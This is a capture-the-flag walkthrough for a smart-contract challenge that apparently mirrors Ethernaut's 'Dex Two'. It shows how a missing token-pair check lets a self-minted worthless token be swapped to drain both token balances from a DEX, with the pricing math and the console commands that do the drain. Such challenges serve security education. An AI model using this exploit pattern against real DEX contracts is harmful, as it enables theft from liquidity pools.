# Drain Token1 and Token2 from Dex

This challenge is very similar to previous challenge "DEX". A critical different is the checking function before swapping is gone.
```
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```
This means that we can call any token on the DEX to swap. So we can exploit this by minting our own useless token and use it to swap for token1 and token2.

Before start, we check the equation used to calculate swap amount:
```
return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
```
This could be summarized as:
```
Swap Amount = <AMOUNT_WE_SWAP> * <DEX_BALANCE_TOKEN_WE_WANT> / <DEX_BALANCE_TOKEN_WE_MINT>
```

Initially we would want to drain balance of token1, which is 100, assuming <DEX_BALANCE_TOKEN_WE_MINT> is 100 :
```
100 = <AMOUNT_WE_SWAP> * Dex_t1 / Dex_bad
100 = <AMOUNT_WE_SWAP> * 100 / (100)
100 = <AMOUNT_WE_SWAP>
```
We get the amount needed to swap for draining token 1 is 100.

On second swap, we want to drain token2 balance which is 100, <DEX_BALANCE_TOKEN_WE_MINT> is now 200 since we sent 100 on first swap:
```
100 = <AMOUNT_WE_SWAP> * Dex_t2 / Dex_bad
100 = <AMOUNT_WE_SWAP> * 100 / (200)
200 = <AMOUNT_WE_SWAP>
```

Initially DEX need to have 100 token we minted to swap and drain 100 token1, While token2 will need 200 minted token to swap and drain. So in summary, we will need to mint 400 token, 100 for DEX, 300 for us to swap.

Once we figured out the math, go back to browser's console terminal:
```
t1 = await contract.token1()
t2 = await contract.token2()
bad = "<YOUR_MINTED_TOKEN_ADDRESS>"
```
To mint the token refer "L23-Solution.sol". After minting, use the `transfer` function to send 100 token to DEX.

Next, we follow the step from the challenge "DEX" to `approve` token1, token2 and BAD (the token we minted).

Proceed to swap and drain token1 and token2:
```
contract.swap(bad, t1, 100)
contract.swap(bad, t2, 200)
```

Verify:
```
contract.balanceOf(t1, instance).then(v => v.toString())
contract.balanceOf(t2, instance).then(v => v.toString())
```
